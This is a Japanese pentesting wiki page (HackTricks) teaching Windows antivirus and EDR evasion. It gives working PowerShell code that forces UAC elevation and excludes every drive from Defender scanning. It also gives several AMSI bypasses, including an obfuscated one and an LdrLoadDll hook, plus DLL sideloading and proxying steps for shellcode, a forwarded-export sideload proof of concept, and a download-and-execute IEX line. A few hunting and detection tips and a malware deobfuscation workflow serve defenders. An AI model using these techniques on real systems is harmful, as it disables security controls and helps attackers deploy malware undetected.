# アンチウイルス（AV）回避

{{#include ../banners/hacktricks-training.md}}

**このページの初稿執筆者:** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Defenderを停止

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defenderを停止するツール。
- [no-defender](https://github.com/es3n1n/no-defender): 別のAVを装ってWindows Defenderを停止するツール。
- [管理者権限でDefenderを無効化](basic-powershell-for-pentesters/README.md)

### Defenderを改変する前にインストーラー風にUACを誘導する

ゲームチートを装った公開ローダーは、署名のないNode.js/Nexeインストーラーとして配布されることが多く、まず**ユーザーに昇格を求めてから**Defenderを無力化します。流れはシンプルです。

1. `net session` で管理者権限の有無を確認します。このコマンドは呼び出し元が管理者権限を持つ場合にのみ成功するため、失敗した場合、ローダーは標準ユーザーとして実行されています。
2. 元のコマンドラインを維持したまま、`RunAs` 動詞を使って直ちに自身を再起動し、想定されるUAC同意プロンプトを表示します。

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

被害者はすでに「cracked」ソフトウェアをインストールしていると信じているため、通常はプロンプトを受け入れ、マルウェアに Defender のポリシーを変更するために必要な権限を与えてしまいます。<sup>[[26]](#references)</sup>

### すべてのドライブ文字に対する包括的な `MpPreference` 除外

昇格後、GachiLoader 系のチェーンはサービスを完全に無効化するのではなく、Defender の死角を最大限に広げます。まずローダーは GUI の watchdog（`taskkill /F /IM SecHealthUI.exe`）を終了させ、その後、**極めて広範な除外**を追加して、すべてのユーザープロファイル、システムディレクトリ、リムーバブルディスクをスキャン対象外にします。

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

主な観察事項:

- ループはマウントされているすべてのファイルシステム（D:\、E:\、USBメモリなど）を調べるため、**今後ディスク上のどこに配置されるペイロードも無視される**。
- `.sys` 拡張子の除外は将来を見越したものです。攻撃者は、後でDefenderに再度触れることなく、署名されていないドライバーを読み込める選択肢を残しています。
- 変更はすべて `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` の下に保存されるため、後続の段階で、UACを再度トリガーすることなく、除外が維持されていることを確認したり、除外を追加したりできます。

Defenderのサービスは停止されないため、単純なヘルスチェックでは「antivirus active」と報告され続けますが、実際にはリアルタイム検査がこれらのパスに適用されることはありません。<sup>[[26]](#references)</sup>

## **AV回避の方法論**

現在、AVはファイルが悪意のあるものかどうかを確認するために、静的検出、動的解析、さらに高度なEDRでは振る舞い分析など、さまざまな方法を使用しています。

### **静的検出**

静的検出では、バイナリやスクリプト内の既知の悪意ある文字列やバイト列を検出するほか、ファイル自体から情報（ファイルの説明、会社名、デジタル署名、アイコン、チェックサムなど）を抽出します。つまり、既知の公開ツールを使うと、すでに解析されて悪意のあるものとしてフラグ付けされている可能性が高いため、見つかりやすくなります。この種の検出を回避する方法はいくつかあります。

- **暗号化**

バイナリを暗号化すれば、AVがプログラムを検出する手段はなくなりますが、メモリ内で復号して実行するための何らかのloaderが必要です。

- **難読化**

場合によっては、バイナリやスクリプト内の文字列を変更するだけでAVをすり抜けられますが、難読化する対象によっては時間のかかる作業になります。

- **独自ツールの開発**

独自のツールを開発すれば、既知の不正なシグネチャはありませんが、多くの時間と労力がかかります。

> [!TIP]
> Windows Defenderの静的検出を確認するには、[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)がおすすめです。ファイルを複数のセグメントに分割し、それぞれをDefenderに個別にスキャンさせます。これにより、バイナリ内でフラグ付けされた文字列やバイトを正確に特定できます。

実践的なAV回避に関するこの[YouTubeプレイリスト](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)もぜひご覧ください。

### **動的解析**

動的解析とは、AVがバイナリをsandbox内で実行し、悪意のある動作（ブラウザーのパスワードを復号して読み取ろうとする、LSASSのminidumpを実行するなど）を監視することです。この部分への対処は少し難しい場合がありますが、sandboxを回避するためにできることをいくつか紹介します。

- **実行前にsleepする** 実装方法によっては、AVの動的解析を回避する有効な方法になります。AVがファイルをスキャンできる時間は、ユーザーの作業を妨げないよう非常に短いため、長時間sleepさせるとバイナリの解析を妨げられます。ただし、多くのAV sandboxでは、実装方法によってsleepをスキップできる点が問題です。
- **マシンのリソースを確認する** 通常、sandboxに割り当てられるリソースは少量です（例: RAMが2GB未満）。そうでなければ、ユーザーのマシンの動作が遅くなる可能性があります。CPU温度やファンの回転速度を確認するなど、工夫することもできます。sandboxですべての機能が実装されているとは限りません。
- **マシン固有の確認を行う** 「contoso.local」ドメインに参加しているワークステーションのユーザーを標的にする場合、コンピューターのドメインを確認し、指定したものと一致するか調べられます。一致しなければ、プログラムを終了させます。

Microsoft Defenderのsandboxのコンピューター名はHAL9THであることがわかっています。そのため、detonationの前にマルウェア内でコンピューター名を確認できます。名前がHAL9THならDefenderのsandbox内にいるということなので、プログラムを終了させられます。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>出典: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

sandbox対策について、[@mgeeky](https://twitter.com/mariuszbit)によるその他の優れたヒント

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

この記事で前述したように、**公開ツール**はいずれ**検出される**ため、次のことを自問してください。

たとえば、LSASSをdumpしたい場合、**本当にmimikatzを使う必要がありますか**？ それとも、知名度が低く、LSASSをdumpできる別のプロジェクトを使えますか？

おそらく後者が正解です。mimikatzを例にすると、AVやEDRに最も多くフラグ付けされているマルウェアの一つであり、もしかすると最も多いかもしれません。プロジェクト自体は非常に優れていますが、AVを回避するために使うには厄介です。そのため、目的を達成できる代替手段を探しましょう。

> [!TIP]
> 回避のためにペイロードを変更する場合は、Defenderの**自動サンプル送信をオフにしてください**。また、長期的に回避を実現したいのであれば、**絶対にVIRUSTOTALにアップロードしないでください**。特定のAVでペイロードが検出されるか確認したい場合は、VMにそのAVをインストールし、自動サンプル送信をオフにして、結果に納得できるまでそこでテストしてください。

## EXEとDLLの比較

可能な場合は、回避には常に**DLLの使用を優先してください**。私の経験では、DLLファイルは通常、**検出や解析を受ける可能性がかなり低い**ため、（もちろんペイロードをDLLとして実行する方法がある場合）検出を避けるための非常に簡単な方法です。

この画像に示すように、HavocのDLL Payloadはantiscan.meで4/26の検出率ですが、EXE payloadは7/26です。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>通常のHavoc EXE payloadと通常のHavoc DLLをantiscan.meで比較</p></figcaption></figure>

次に、DLLファイルを使って、さらにステルス性を高めるためのテクニックをいくつか紹介します。

## DLL Sideloading & Proxying

**DLL Sideloading**は、loaderが使用するDLLの検索順序を利用し、標的アプリケーションと悪意のあるpayloadを同じ場所に配置する手法です。

[Siofra](https://github.com/Cybereason/siofra)と次のpowershellスクリプトを使うと、DLL Sideloadingの影響を受けやすいプログラムを確認できます。

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

このコマンドは、"C:\Program Files\\" 内で DLL hijacking の影響を受けるプログラムと、それらが読み込もうとする DLL ファイルの一覧を出力します。

**DLL Hijackable/Sideloadable programs** は自分で調べることを強くおすすめします。この technique は適切に実行すればかなり stealthy ですが、公開されている DLL Sideloadable programs を使うと、簡単に検知される可能性があります。

プログラムが読み込もうとする名前の悪意のある DLL を配置するだけでは、payload は読み込まれません。プログラムはその DLL 内に特定の関数があることを想定しているためです。この問題を解決するために、**DLL Proxying/Forwarding** と呼ばれる別の technique を使います。

**DLL Proxying** は、プログラムが proxy（悪意のある）DLL に対して行う呼び出しを元の DLL に転送します。これにより、プログラムの機能を維持しながら、payload の実行を処理できます。

[@flangvik](https://twitter.com/Flangvik/) の [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project を使用します。

以下は、私が実行した手順です。

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

最後のコマンドで、DLLのソースコードテンプレートと、名前を変更した元のDLLの2つのファイルが生成されます。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

これが結果です:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

[SGN](https://github.com/EgeBalci/sgn)でエンコードしたshellcodeとproxy DLLの両方が、[antiscan.me](https://antiscan.me)で検出率0/26でした！成功と言えるでしょう。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloadingについて解説している[S3cur3Th1sSh1tのtwitch VOD](https://www.twitch.tv/videos/1644171543)と、[ippsecの動画](https://www.youtube.com/watch?v=3eROsG_WNpE)を視聴して、ここで話した内容についてさらに詳しく学ぶことを**強くおすすめ**します。

### Forwarded Exportsの悪用 (ForwardSideLoading)

Windows PEモジュールは、実際には「forwarder」である関数をexportできます。つまり、exportエントリはコードを指すのではなく、`TargetDll.TargetFunc`形式のASCII文字列を含みます。呼び出し元がexportを解決すると、Windows loaderは次の処理を行います:

- `TargetDll`がまだロードされていない場合はロードする
- `TargetFunc`をそこから解決する

理解しておくべき主な動作:
- `TargetDll`がKnownDLLの場合、保護されたKnownDLLs namespaceから提供されます (例: ntdll、kernelbase、ole32)。<sup>[[15]](#references)</sup>
- `TargetDll`がKnownDLLでない場合、通常のDLL search orderが使われます。この検索順序には、forward解決を行うモジュールのディレクトリも含まれます。

これにより、間接的なsideloadingの手法が可能になります。関数がKnownDLLではないモジュール名にforwardされている署名済みDLLを見つけ、その署名済みDLLと同じ場所に、forward先のモジュールとまったく同じ名前を付けた攻撃者が制御するDLLを配置します。forwarded exportが呼び出されると、loaderはforward先を解決し、同じディレクトリから攻撃者のDLLをロードして、DllMainを実行します。<sup>[[13]](#references)</sup>

Windows 11で確認された例:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順序で解決されます。

PoC（コピーして貼り付け）:
1) 署名済みのシステム DLL を書き込み可能なフォルダーにコピーする
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 悪意のある `NCRYPTPROV.dll` を同じフォルダーに配置します。コード実行には最小限の DllMain で十分です。DllMain を実行させるために、転送先関数を実装する必要はありません。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) 署名済みの LOLBin を使って転送をトリガーする:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed behavior:
- rundll32（署名済み）がside-by-sideの`keyiso.dll`（署名済み）を読み込む
- `KeyIsoSetAuditingInterface`の解決時に、ローダーはforward先の`NCRYPTPROV.SetAuditingInterface`をたどる
- その後、ローダーは`C:\test`から`NCRYPTPROV.dll`を読み込み、その`DllMain`を実行する
- `SetAuditingInterface`が実装されていない場合でも、`DllMain`の実行後に初めて「missing API」エラーが発生する

Hunting tips:
- 転送先のモジュールがKnownDLLではないforwarded exportsに注目する。KnownDLLsは`HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`に記載されている
- 次のようなtoolingを使ってforwarded exportsを列挙できる。
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 候補を検索するには、Windows 11 forwarder inventory を参照してください：https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

検知／防御のアイデア：
- LOLBins（例：rundll32.exe）がシステム外のパスから署名済みDLLを読み込み、その後、同じディレクトリから同じベース名の非KnownDLLsを読み込む動作を監視する
- 次のようなプロセス／モジュールの連鎖を検知する：`rundll32.exe` → システム外の `keyiso.dll` → ユーザーが書き込み可能なパスにある `NCRYPTPROV.dll`
- コード整合性ポリシー（WDAC/AppLocker）を適用し、アプリケーションディレクトリでの書き込み＋実行を拒否する

## [**Freeze**](https://github.com/optiv/Freeze)

`Freezeは、一時停止中のプロセス、direct syscalls、代替の実行方法を用いてEDRをバイパスするためのpayload toolkitです`

Freezeを使うと、shellcodeをステルス性の高い方法で読み込み、実行できます。

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasionはいたちごっこです。今日有効な手法も明日には検知される可能性があるため、1つのツールだけに頼らず、可能であれば複数のEvasion techniquesを組み合わせてください。

## Direct/Indirect SyscallsとSSNの解決（SysWhispers4）

EDRは、`ntdll.dll`のsyscall stubに**user-mode inline hook**を設置することがよくあります。これらのhookを回避するには、正しい**SSN**（System Service Number）を読み込み、hookされたexport entrypointを実行せずにkernel modeへ移行する**direct**または**indirect** syscall stubを生成できます。<sup>[[32]](#references)</sup>

**呼び出し方法：**
- **Direct（embedded）**: 生成されたstubに`syscall`/`sysenter`/`SVC #0`命令を出力します（`ntdll`のexportにはアクセスしません）。
- **Indirect**: `ntdll`内にある既存の`syscall` gadgetへjumpし、kernelへの移行が`ntdll`から発生したように見せます（heuristic evasionに有用）。**randomized indirect**では、呼び出しごとにpoolからgadgetを選択します。
- **Egg-hunt**: 静的な`0F 05` opcode sequenceをdisk上に埋め込むのを避け、runtimeにsyscall sequenceを解決します。

**hookに耐性のあるSSN解決方法：**
- **FreshyCalls (VA sort)**: stubのbyteを読み取る代わりに、syscall stubをvirtual addressでsortしてSSNを推定します。
- **SyscallsFromDisk**: クリーンな`\KnownDlls\ntdll.dll`をmapし、その`.text`からSSNを読み取ってからunmapします（メモリ上のすべてのhookを回避します）。
- **RecycledGate**: VA順のSSN推定と、stubがクリーンな場合のopcode validationを組み合わせます。hookされている場合はVA推定にfallbackします。
- **HW Breakpoint**: `syscall`命令にDR0を設定し、VEHを使ってruntimeに`EAX`からSSNを取得します。hookされたbyteの解析は不要です。

SysWhispers4の使用例：
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSIは「[ファイルレスマルウェア](https://en.wikipedia.org/wiki/Fileless_malware)」を防ぐために作られました。当初、AVがスキャンできるのは**ディスク上のファイル**だけでした。そのため、ペイロードを何らかの方法で**メモリ上で直接**実行できれば、AVにはそれを防ぐための十分な可視性がなく、何もできませんでした。

AMSI機能は、Windowsの以下のコンポーネントに統合されています。

- ユーザーアカウント制御（UAC）（EXE、COM、MSI、ActiveXのインストール時の昇格）
- PowerShell（スクリプト、対話型の使用、動的なコード評価）
- Windows Script Host（wscript.exeおよびcscript.exe）
- JavaScriptおよびVBScript
- Office VBAマクロ

スクリプトの内容を暗号化も難読化もされていない状態で公開することで、ウイルス対策ソリューションがスクリプトの動作を検査できるようになります。

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` を実行すると、Windows Defenderで以下のアラートが発生します。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:` に続いて、スクリプトを実行した実行ファイルのパスが付加されていることに注目してください。この場合は powershell.exe です。

ディスクにはファイルを一切書き込みませんでしたが、AMSIによってメモリ上で検知されました。

さらに、**.NET 4.8**以降では、C#コードもAMSIを通じて実行されます。これにより、メモリ上で実行するための `Assembly.Load(byte[])` も影響を受けます。そのため、AMSIを回避してメモリ上で実行したい場合は、低いバージョンの.NET（4.7.2以下など）の使用が推奨されます。

AMSIを回避する方法はいくつかあります。

- **難読化**

AMSIは主に静的検知を行うため、読み込もうとするスクリプトを変更することは、検知を回避する有効な方法になり得ます。

ただし、AMSIには複数の層があるスクリプトでも難読化を解除する機能があるため、難読化の方法によっては有効でないことがあります。そのため、回避はそれほど単純ではありません。一方、場合によっては変数名をいくつか変更するだけで十分なこともあるため、どの程度検知対象としてフラグ付けされているかによります。

- **AMSI Bypass**

AMSIはDLLをpowershell（およびcscript.exe、wscript.exeなど）のプロセスに読み込むことで実装されているため、権限のないユーザーとして実行していても簡単に改変できます。AMSIの実装上のこの欠陥を受けて、研究者たちはAMSIスキャンを回避する複数の方法を発見しました。

**エラーを強制する**

AMSIの初期化を失敗させる（amsiInitFailed）と、現在のプロセスではスキャンが開始されなくなります。これは当初、[Matt Graeber](https://twitter.com/mattifestation)によって公開され、その後Microsoftは広範な悪用を防ぐためのシグネチャを開発しました。

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

PowerShell codeを1行実行するだけで、現在のPowerShellプロセスでAMSIを使用不能にできました。もちろん、この行自体がAMSIによって検出されるため、この手法を使うには何らかの変更が必要です。

以下は、[Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)から引用した、変更済みのAMSI bypassです。

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Keep in mind, この投稿が公開された後はおそらく検知されるため、検知されずにいるつもりなら、コードを公開すべきではありません。

**Memory Patching**

この手法は当初[@RastaMouse](https://twitter.com/_RastaMouse/)によって発見されました。ユーザーが入力した内容のスキャンを担当するamsi.dll内の「AmsiScanBuffer」関数のアドレスを見つけ、E_INVALIDARGのコードを返す命令で上書きします。こうすることで、実際のスキャン結果は0となり、クリーンな結果として扱われます。

> [!TIP]
> 詳しい説明については、[https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)をお読みください。

powershellでAMSIをバイパスするために使われる手法は他にも多数あります。詳しくは[**このページ**](basic-powershell-for-pentesters/index.html#amsi-bypass)と[**このrepo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)をご覧ください。

### amsi.dllの読み込みを防いでAMSIをブロックする（LdrLoadDll hook）

AMSIは、現在のプロセスに`amsi.dll`が読み込まれた後にのみ初期化されます。堅牢で言語に依存しないバイパス方法は、`ntdll!LdrLoadDll`にユーザーモードhookを設置し、要求されたモジュールが`amsi.dll`の場合にエラーを返すことです。その結果、AMSIは読み込まれず、そのプロセスではスキャンが実行されません。<sup>[[23]](#references)</sup>

実装の概要（x64 C/C++の疑似コード）：
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
メモ
- PowerShell、WScript/CScript、カスタムローダーなど、AMSIを読み込むものなら何でも機能します。
- スクリプトをstdin経由で渡す方法（`PowerShell.exe -NoProfile -NonInteractive -Command -`）と組み合わせると、コマンドラインに長い痕跡が残るのを避けられます。
- LOLBins経由で実行されるローダーで使われた例があります（例：`DllRegisterServer`を呼び出す`regsvr32`）。

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)**というツールも、AMSIをバイパスするスクリプトを生成します。
**[https://amsibypass.com/](https://amsibypass.com/)**というツールも、ランダム化されたユーザー定義関数、変数、文字式を使い、PowerShellキーワードの大文字・小文字をランダムに変更してシグネチャを回避する、AMSIをバイパスするスクリプトを生成します。

**検出されたシグネチャを削除する**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)**や**[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**などのツールを使って、現在のプロセスのメモリから検出されたAMSIシグネチャを削除できます。このツールは、現在のプロセスのメモリをスキャンしてAMSIシグネチャを探し、それをNOP命令で上書きすることで、メモリから実質的に削除します。

**AMSIを使用するAV/EDR製品**

AMSIを使用するAV/EDR製品の一覧は、**[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**で確認できます。

**PowerShell version 2を使う**
PowerShell version 2ではAMSIが読み込まれないため、AMSIによるスキャンを受けずにスクリプトを実行できます。次のようにします。

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell loggingは、システム上で実行されたすべてのPowerShellコマンドを記録できる機能です。監査やトラブルシューティングに役立ちますが、**検知を回避したい攻撃者にとっては問題になる可能性があります**。

PowerShell loggingをバイパスするには、次の手法を使用できます。

- **PowerShell TranscriptionとModule Loggingを無効化する**: この目的には、[https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs)などのツールを使用できます。
- **Powershell version 2を使用する**: PowerShell version 2ではAMSIが読み込まれないため、AMSIのスキャンを受けずにスクリプトを実行できます。次のように実行します: `powershell.exe -version 2`
- **unmanaged PowerShell sessionを使用する**: [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell)を使うと、`powershell.exe`を起動せずにPowerShellをホストできます（Cobalt Strikeの`powerpick`で使われている手法）。これにより、`powershell.exe`プロセスに特化した制御は回避できますが、AMSI、Script Block Logging、その他すべてのPowerShell防御が自動的に無効になるわけではありません。保護範囲はランタイムとホストの実装によって異なります。


## Obfuscation

> [!TIP]
> いくつかのobfuscation手法ではデータを暗号化するため、バイナリのエントロピーが増加し、AVやEDRに検知されやすくなります。この点に注意し、必要に応じて、機密情報を含む、または隠す必要のあるコードの特定の箇所にのみ暗号化を適用してください。

### ConfuserExで保護された.NETバイナリの難読化解除

ConfuserEx 2（または商用フォーク）を使用したマルウェアを解析する際は、デコンパイラやサンドボックスを妨げる複数層の保護に直面することがよくあります。以下のワークフローを使うと、ほぼ元のILを確実に**復元**でき、その後、dnSpyやILSpyなどのツールでC#にデコンパイルできます。<sup>[[10]](#references)</sup>

1.  アンチタンパリングの除去 – ConfuserExはすべての*メソッド本体*を暗号化し、*モジュール*の静的コンストラクター（`<Module>.cctor`）内で復号します。また、PE checksumにもパッチを適用するため、変更を加えるとバイナリがクラッシュします。**AntiTamperKiller**を使って暗号化されたメタデータテーブルを特定し、XORキーを復元して、クリーンなアセンブリを書き出します:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Outputには、独自のunpackerを作成する際に役立つ6つのanti-tamperパラメータ（`key0-key3`、`nameHash`、`internKey`）が含まれています。

2.  シンボル / control-flowの復元 – *clean*ファイルを**de4dot-cex**（ConfuserExに対応したde4dotのfork）に渡します。
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – ConfuserEx 2 プロファイルを選択
     • de4dot は control-flow flattening を元に戻し、元の namespace、class、変数名を復元して、定数文字列を復号します。

3.  Proxy-call stripping – ConfuserEx は、逆コンパイルをさらに妨げるため、直接のメソッド呼び出しを軽量なラッパー（*proxy calls* とも呼ばれます）に置き換えます。**ProxyCall-Remover** を使って削除します:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   この手順の後、難読化されたラッパー関数（`Class8.smethod_10`、…）ではなく、`Convert.FromBase64String` や `AES.Create()` のような通常の .NET API が確認できるはずです。

4.  手動クリーンアップ – 生成されたバイナリを dnSpy で実行し、大きな Base64 blob や `RijndaelManaged`/`TripleDESCryptoServiceProvider` の使用箇所を検索して、*実際の* payload を特定します。多くの場合、マルウェアは `<Module>.byte_0` 内で初期化される TLV エンコード済みの byte 配列として保存しています。

この一連の処理により、悪意のあるサンプルを実行せずに実行フローを復元できます。オフラインのワークステーションで作業する際に役立ちます。

> 🛈  ConfuserEx は `ConfusedByAttribute` というカスタム属性を生成します。この属性は IOC として使用し、サンプルを自動的にトリアージできます。

#### ワンライナー
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトは、[code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>)と改ざん防止によってソフトウェアのセキュリティを高められる、[LLVM](http://www.llvm.org/)コンパイルスイートのオープンソースフォークを提供することを目的としています。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscatorは、外部ツールを使わず、コンパイラを変更することもなく、`C++11/14`言語を使ってコンパイル時に難読化コードを生成する方法を示します。
- [**obfy**](https://github.com/fritzone/obfy): C++テンプレートメタプログラミングフレームワークで生成される難読化処理のレイヤーを追加し、アプリケーションをクラックしようとする人の作業を少し難しくします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatrazは、.exe、.dll、.sysなど、さまざまなPEファイルを難読化できるx64バイナリ難読化ツールです。
- [**metame**](https://github.com/a0rtega/metame): Metameは、任意の実行ファイルを対象とするシンプルなメタモーフィックコードエンジンです。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscatorは、ROP（return-oriented programming）を利用し、LLVMがサポートする言語向けに細粒度のコード難読化を行うフレームワークです。通常の命令をROPチェーンに変換してアセンブリコードレベルでプログラムを難読化し、通常の制御フローに対する自然な認識を覆します。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcryptは、Nimで書かれた.NET PE Crypterです。
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptorは既存のEXE/DLLをshellcodeに変換してロードできます。

### LLVMコンパイラ支援による関数単位の自己マスキング

implant全体をスリープ中だけマスキングする代わりに、変更したLLVM X86 backendを使えば、選択した関数が非アクティブな間、常にXORマスキングされた状態にできます。Function Peekaboo PoCは、デマングル後の名前に`REG_`を含む関数を選択し、最終的なマシンコードの前後に位置独立のentry/exit stubを挿入して、共有のマスキングhandlerを`.text`に出力します。ソースレベルのシグネチャとWindows x64 calling conventionは変更されません。<sup>[[38]](#references)[[39]](#references)</sup>

#### Backendの制御フロー変換

この処理は、命令選択と最適化の後に行う必要があります。変換では**出力されるすべてのreturn**を対象にし、正確なx86レイアウトを把握する必要があるためです。出力前の`MachineFunctionPass`で最後の`MachineInstr::isReturn()`を見つけて削除し、最終経路が追加されたepilogueへフォールスルーするようにします。それ以前のreturnは`JMP_1 handler`に置き換えます。各returnの前にコンパイラが生成したスタックやフレームのteardownがある場合はそのまま残し、return命令だけをリダイレクトします。<sup>[[38]](#references)[[39]](#references)</sup>

